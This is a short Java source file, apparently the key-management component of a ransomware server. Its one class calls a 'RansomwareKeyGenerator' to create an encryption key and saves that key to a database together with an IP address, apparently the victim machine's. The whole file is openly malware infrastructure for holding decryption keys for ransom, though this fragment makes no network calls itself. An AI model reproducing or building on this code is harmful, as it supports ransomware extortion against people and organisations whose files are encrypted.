package com.server.app.keys;

import java.security.NoSuchAlgorithmException;

import javax.inject.Inject;

import com.server.app.entities.CryptoKey;
import com.server.app.exceptions.AlgorithmNotFoundException;
import com.server.app.repositories.KeyRepository;

public class KeyManagement {
	@Inject
	private KeyRepository repository;
	@Inject
	private RansomwareKeyGenerator generator;

	public CryptoKey createAndSaveKey(String encalgo, String ip)
			throws AlgorithmNotFoundException, NoSuchAlgorithmException {

		return (repository.save(new CryptoKey(ip, generator.generateKey(encalgo), encalgo))); // Save to DB

	}
}
